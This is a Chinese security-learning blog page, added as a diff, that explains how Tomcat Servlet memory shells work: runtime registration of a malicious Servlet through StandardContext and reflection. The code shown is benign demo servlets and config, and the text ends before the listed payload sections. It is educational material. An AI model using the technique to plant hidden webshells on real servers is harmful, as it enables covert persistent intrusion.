@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zifeiyu-sec.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="servlet内存马是通过动态注册恶意Servlet到Web容器的Servlet映射中，无需落地文件，利用Servlet处理HTTP请求的机制，使恶意Servlet能响应特定路径的请求并执行命令、窃取数据等操作，依赖Web容器的Servlet注册接口（如ServletContext的addServlet方法），通过反射等技术完成注入，隐蔽性强且可长期驻留内存。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全之Servlet内存马">
+<meta property="og:url" content="http://zifeiyu-sec.github.io/2025/10/21/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BServlet%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="子非鱼的博客">
+<meta property="og:description" content="servlet内存马是通过动态注册恶意Servlet到Web容器的Servlet映射中，无需落地文件，利用Servlet处理HTTP请求的机制，使恶意Servlet能响应特定路径的请求并执行命令、窃取数据等操作，依赖Web容器的Servlet注册接口（如ServletContext的addServlet方法），通过反射等技术完成注入，隐蔽性强且可长期驻留内存。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251018140059719.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251018140324721.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251018141342721.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/ob-20251018154243202.png">
+<meta property="article:published_time" content="2025-10-21T09:11:10.000Z">
+<meta property="article:modified_time" content="2025-10-31T09:33:09.595Z">
+<meta property="article:author" content="子非鱼">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zifeiyu-sec.github.io/images/ob-20251018140059719.png">
+
+
+<link rel="canonical" href="http://zifeiyu-sec.github.io/2025/10/21/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BServlet%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://zifeiyu-sec.github.io/2025/10/21/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BServlet%E5%86%85%E5%AD%98%E9%A9%AC/","path":"2025/10/21/Java攻防/Java安全之Servlet内存马/","title":"Java安全之Servlet内存马"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Java安全之Servlet内存马 | 子非鱼的博客</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"cdn":"https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.7.0/mermaid.min.js","integrity":"sha256-4+IKDqhZ/sXjc8Wtl2/MsxI4e0s1KpEVdbEP7V/Lz8U="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">子非鱼的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在时间的尺度上，一切问题都有答案</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">Servlet内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.</span> <span class="nav-text">Servlet内存马的技术原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Tomcat%E7%AD%89%E5%AE%B9%E5%99%A8%E7%9A%84Servlet%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6"><span class="nav-number">1.1.1.</span> <span class="nav-text">Tomcat等容器的Servlet加载机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#StandardContext-%E5%9C%A8-Tomcat-%E4%B8%AD%E7%9A%84%E8%A7%92%E8%89%B2"><span class="nav-number">1.1.2.</span> <span class="nav-text">StandardContext 在 Tomcat 中的角色</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E7%BB%84%E4%BB%B6%E8%AF%A6%E8%A7%A3"><span class="nav-number">1.1.3.</span> <span class="nav-text">关键组件详解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Context%EF%BC%88%E4%B8%8A%E4%B8%8B%E6%96%87%EF%BC%89"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">1. Context（上下文）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Wrapper"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">2. Wrapper</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-Servlet"><span class="nav-number">1.1.3.3.</span> <span class="nav-text">3. Servlet</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.4.</span> <span class="nav-text">核心原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%BC%94%E7%A4%BA"><span class="nav-number">1.2.</span> <span class="nav-text">代码演示</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Servlet%E7%AE%80%E5%8D%95%E6%BC%94%E7%A4%BA"><span class="nav-number">1.2.1.</span> <span class="nav-text">Servlet简单演示</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F"><span class="nav-number">1.2.2.</span> <span class="nav-text">注意</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.2.3.</span> <span class="nav-text">内存马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E9%85%8D%E7%BD%AE%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B"><span class="nav-number">1.2.4.</span> <span class="nav-text">静态配置加载过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E9%85%8D%E7%BD%AE%E2%80%93%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.2.5.</span> <span class="nav-text">动态配置–注入内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">流程:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%88%9B%E5%BB%BA%E6%81%B6%E6%84%8FServlet%E7%B1%BB"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">1. 创建恶意Servlet类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E8%8E%B7%E5%8F%96context%EF%BC%9AStandardContext%EF%BC%88%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%EF%BC%89"><span class="nav-number">1.2.5.3.</span> <span class="nav-text">2. 获取context：StandardContext（通过反射）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E8%B0%83%E7%94%A8-context-createWrapper-%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%85%A8%E6%96%B0%E7%9A%84-Wrapper%E3%80%82"><span class="nav-number">1.2.5.4.</span> <span class="nav-text">3. 调用 context.createWrapper() 创建一个全新的 Wrapper。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E5%B0%86-Wrapper-%E6%B7%BB%E5%8A%A0%E5%88%B0-StandardContext"><span class="nav-number">1.2.5.5.</span> <span class="nav-text">4. 将 Wrapper 添加到 StandardContext</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E6%B3%A8%E5%86%8C-URL-%E6%98%A0%E5%B0%84%E8%B7%AF%E5%BE%84"><span class="nav-number">1.2.5.6.</span> <span class="nav-text">5. 注册 URL 映射路径</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.2.6.</span> <span class="nav-text">完整内存马</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="子非鱼"
+      src="/images/1.png">
+  <p class="site-author-name" itemprop="name">子非鱼</p>
+  <div class="site-description" itemprop="description">学习过程的记录</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">40</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zifeiyu-sec" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://gitee.com/zifeiyu-sec" title="Gitee → https:&#x2F;&#x2F;gitee.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>Gitee</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://example.com/" title="https:&#x2F;&#x2F;example.com" rel="noopener" target="_blank">Title</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zifeiyu-sec.github.io/2025/10/21/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BServlet%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.png">
+      <meta itemprop="name" content="子非鱼">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="子非鱼的博客">
+      <meta itemprop="description" content="学习过程的记录">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Java安全之Servlet内存马 | 子非鱼的博客">
+      <meta itemprop="description" content="servlet内存马是通过动态注册恶意Servlet到Web容器的Servlet映射中，无需落地文件，利用Servlet处理HTTP请求的机制，使恶意Servlet能响应特定路径的请求并执行命令、窃取数据等操作，依赖Web容器的Servlet注册接口（如ServletContext的addServlet方法），通过反射等技术完成注入，隐蔽性强且可长期驻留内存。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java安全之Servlet内存马
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-10-21 17:11:10" itemprop="dateCreated datePublished" datetime="2025-10-21T17:11:10+08:00">2025-10-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-10-31 17:33:09" itemprop="dateModified" datetime="2025-10-31T17:33:09+08:00">2025-10-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">Java攻防</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">servlet内存马是通过动态注册恶意Servlet到Web容器的Servlet映射中，无需落地文件，利用Servlet处理HTTP请求的机制，使恶意Servlet能响应特定路径的请求并执行命令、窃取数据等操作，依赖Web容器的Servlet注册接口（如ServletContext的addServlet方法），通过反射等技术完成注入，隐蔽性强且可长期驻留内存。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1>Servlet内存马</h1>
+<h2 id="Servlet内存马的技术原理"><strong>Servlet内存马的技术原理</strong></h2>
+<h3 id="Tomcat等容器的Servlet加载机制"><strong>Tomcat等容器的Servlet加载机制</strong></h3>
+<ol>
+<li><strong>启动与初始化</strong>：
+<ul>
+<li>当Tomcat启动时，它会解析<code>web.xml</code>文件（或读取<code>@WebServlet</code>注解）来获知需要加载哪些Servlet。</li>
+<li>对于每个定义的Servlet，容器会创建其类的一个实例，并调用其 <code>init()</code> 方法进行一次性初始化。这个过程是<strong>静态的</strong>，在应用启动时完成。</li>
+</ul>
+</li>
+<li><strong>请求处理流程</strong>：
+<ul>
+<li>当一个HTTP请求到达Tomcat时，它首先会被<code>Connector</code>接收。</li>
+<li>然后，请求被传递到对应的<code>Engine</code> -&gt; <code>Host</code> -&gt; <code>Context</code>（即你的Web应用）。</li>
+<li>在<code>Context</code>层面，容器根据请求的URL路径，去查找匹配的<code>Servlet</code>。这个映射关系存储在<code>StandardContext</code>对象的<code>servletMappings</code>属性中。</li>
+<li>找到对应的Servlet后，容器会调用该Servlet的 <code>service()</code> 方法，进而根据请求方法分派到 <code>doGet()</code>, <code>doPost()</code> 等方法。</li>
+</ul>
+</li>
+<li><strong>关键洞察</strong>：
+<ul>
+<li>这个流程的核心是 <strong><code>StandardContext</code></strong>。它是整个Web应用的运行时代表，持有了所有Servlet的定义(<code>children</code>)、映射关系(<code>servletMappings</code>)以及过滤器、监听器等。</li>
+<li><strong>内存马的目标，就是在运行时动态地向这个<code>StandardContext</code>中插入一个恶意的Servlet并为其分配一个URL映射。</strong></li>
+</ul>
+</li>
+</ol>
+<h3 id="StandardContext-在-Tomcat-中的角色"><strong>StandardContext 在 Tomcat 中的角色</strong></h3>
+<ul>
+<li><code>StandardContext</code> 实现了 <code>Context</code> 接口，而 <code>Context</code> 接口继承了 <code>ServletContext</code>。因此，在 Tomcat 中，<code>StandardContext</code> 的实例可以被强转为 <code>ServletContext</code>。</li>
+<li>它是整个 Web 应用的“管理中心”，主要功能包括：
+<ul>
+<li>解析 <code>web.xml</code> 或注解配置</li>
+<li>注册并管理所有的 Servlet、Filter、Listener</li>
+<li>提供 <code>addServlet()</code>、<code>addListener()</code> 等动态注册 API</li>
+<li>维护请求映射表（URL Pattern → Servlet）</li>
+<li>触发应用级别的事件（如 <code>ContextInitialized</code>）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>🔑 <strong>为什么它是内存马的关键？</strong><br>
+因为攻击者一旦能获取到 <code>StandardContext</code> 实例，就可以绕过 <code>web.xml</code> 或注解，就可以通过 Wrapper 动态注册 Servlet，将恶意 Servlet 注入到当前应用中 —— 这正是 <strong>Servlet 型内存马的核心入口</strong>。</p>
+</blockquote>
+<h3 id="关键组件详解"><strong>关键组件详解</strong></h3>
+<h4 id="1-Context（上下文）"><strong>1. Context（上下文）</strong></h4>
+<ul>
+<li>对应一个完整的 Web 应用（如 <code>myapp.war</code>）</li>
+<li>在 Tomcat 中实现类为 <code>StandardContext</code></li>
+<li>职责：
+<ul>
+<li>管理该应用下的所有 Servlet、Filter、Listener</li>
+<li>维护 <code>ServletContext</code> 对象（全局唯一的上下文环境）</li>
+<li>处理 URL 映射（mapping）</li>
+<li>支持动态添加/移除 Servlet（Servlet 3.0+）</li>
+</ul>
+</li>
+</ul>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> request.getServletContext();</span><br></pre></td></tr></table></figure>
+<h4 id="2-Wrapper"><strong>2. Wrapper</strong></h4>
+<ul>
+<li>是 Tomcat 内部对 <strong>Servlet</strong> 的封装</li>
+<li>每个 Servlet 都对应一个 <code>Wrapper</code> 实例</li>
+<li>负责 Servlet 的生命周期管理（创建、初始化、调用、销毁）</li>
+<li>可通过 <code>Context.findChildren()</code> 获取所有 Wrapper</li>
+</ul>
+ <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StandardContext</span> <span class="variable">ctx</span> <span class="operator">=</span> ...; </span><br><span class="line">Object[] wrappers = ctx.findChildren(); <span class="comment">// 返回 Wrapper 数组</span></span><br><span class="line"><span class="keyword">for</span> (Object wrapper : wrappers) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Servlet Name: &quot;</span> + ((Wrapper)wrapper).getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="3-Servlet"><strong>3. Servlet</strong></h4>
+<ul>
+<li>用户编写的业务逻辑类（如 <code>LoginServlet.java</code>）</li>
+<li>被 <code>Wrapper</code> 包装后由容器统一调度</li>
+</ul>
+<h3 id="核心原理">核心原理</h3>
+<p>Servlet 内存马的本质是<strong>动态向 Web 容器（如 Tomcat、Jetty）注册一个恶意 Servlet</strong>，并通过容器的请求分发机制触发恶意代码。其核心依赖于：</p>
+<ol>
+<li>Web 容器的 Servlet 注册机制（如 Tomcat 的<code>ServletContext</code>接口）；</li>
+<li>反射技术获取容器内部对象（避开权限限制）；</li>
+<li>恶意 Servlet 的<code>service</code>方法作为触发点（处理 HTTP 请求时执行恶意逻辑）。</li>
+</ol>
+<h2 id="代码演示">代码演示</h2>
+<h3 id="Servlet简单演示">Servlet简单演示</h3>
+<p>写一个简单的servlet</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.listendemo;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletDemo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="comment">// 获取请求参数  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;name&quot;</span>);  </span><br><span class="line">        <span class="keyword">if</span> (name == <span class="literal">null</span>) name = <span class="string">&quot;Guest&quot;</span>;  </span><br><span class="line">        <span class="comment">// 响应结果  </span></span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>功能：接收前端的<code>name</code>参数，返回 “Hello, XXX”。<br>
+然后在web.xml中配置进行静态注册</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServletDemo<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.example.listendemo.ServletDemo<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServletDemo<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/servletdemo<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后配置好Tomcat后启动项目, 访问该url: /servletdemo<br>
+<a target="_blank" rel="noopener" href="http://localhost:8080/LIstenDemo_war_exploded/servletdemo">http://localhost:8080/LIstenDemo_war_exploded/servletdemo</a><br>
+然后就可以看到页面输出了</p>
+<h3 id="注意">注意</h3>
+<blockquote>
+<p>==但是在这个过程中, 可以看到我们配置路径实在web.xml中静态注册, 或者也可以使用@WebServlet配置, 但都是静态配置, 提前配置好的==<br>
+这个注册过程在Tomcat启动之前就好了, 运行时无法修改<br>
+但内存马的目标时在运行时偷偷测住Servlet, 跳过静态配置<br>
+所以在运行时调用 Tomcat 的<code>addServlet</code>和<code>addMapping</code>方法，就能注册一个 “看不见” 的 Servlet 了—— 这就是内存马的核心思路。</p>
+</blockquote>
+<h3 id="内存马">内存马</h3>
+<p>由此, 我们就可以手搓一个内存马<br>
+首先分析上面servlet的执行过程, 先进行配置. 因为要分析tomcat, 所以在pom.xml中添加配置, 版本和自己的Tomcat的版本保持一致</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.58<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在分析Servlet的执行流程过程前, 可以通过下面文章了解Tomcat的执行过程.<br>
+<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/eVo2ldW_Vemy31HZR0vUbw">Tomcat请求流程源码调试 | 三大组件内存马浅析</a>:<br>
+<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/eVo2ldW_Vemy31HZR0vUbw">https://mp.weixin.qq.com/s/eVo2ldW_Vemy31HZR0vUbw</a><br>
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/u010883443/article/details/107463782?ops_request_misc=%257B%2522request%255Fid%2522%253A%252223dd0b121382742e465782c267ebdf29%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=23dd0b121382742e465782c267ebdf29&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-107463782-null-null.142%5Ev102%5Epc_search_result_base2&amp;utm_term=Tomcat%E6%BA%90%E7%A0%81%E5%88%9D%E8%AF%86%E4%B8%80%20Tomcat%E6%95%B4%E7%90%86%E6%B5%81%E7%A8%8B%E5%9B%BE&amp;spm=1018.2226.3001.4187">Tomcat源码初识一 Tomcat整理流程图</a></p>
+<blockquote>
